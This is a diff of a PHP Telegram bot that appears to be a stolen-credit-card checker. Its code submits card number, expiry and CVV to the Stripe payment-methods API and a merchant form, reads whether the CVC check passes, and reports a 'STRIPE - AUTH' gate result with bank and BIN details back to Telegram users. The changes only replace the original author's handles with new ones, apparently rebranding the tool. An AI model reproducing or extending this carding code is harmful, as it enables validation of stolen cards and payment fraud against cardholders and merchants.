@@ -79,7 +79,7 @@ if(strlen($strlen1 > 2)) {
 $ano = $cvv; 
 $cvv = $mes;
 $mes = $ano1;}
-$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@SHADOWDEMIN</code></b>");
 $respon = json_decode($sss, TRUE);
 $message_id_1 = $respon['result']['message_id'];
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -151,7 +151,7 @@ curl_close($ch);
     }
     
     
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@SHADOWDEMIN</code></b>");
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
@@ -185,7 +185,7 @@ $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $brand = trim(strip_tags(getStr($result1,'"brand": "','"')));
 curl_close($ch);
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@SHADOWDEMIN</code></b>");
 
     
     $ch = curl_init();
@@ -223,7 +223,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username='.$usrnm
   $result = curl_exec($ch);
 $cvc_check = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
 curl_close($ch);
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@SHADOWDEMIN</code></b>");
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -325,14 +325,14 @@ if (strpos($result, '"cvc_check": "pass"')) {
 
 $result = urlencode("<b>
 GATE --> <i>STRIPE - AUTH</i>
-CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
+CC ->> <code>$cc|$mes|$ano|$cvv|@hackingcourseschat</code>
 Result ->> $status
 Message ->> $cc_code
 Bin Info ->> $bincap4-$bincap3-$bincap5
 Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
 Time ->> {$mytime($starttime)}s
 Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
-Bot By --> <code>@r0ld3x</code></b>");
+Bot By --> <code>@SHADOWDEMIN</code></b>");
 edit_message($chatId,$message_id_1,$keyboard, $result);
     rest($list);
     $timest = time();
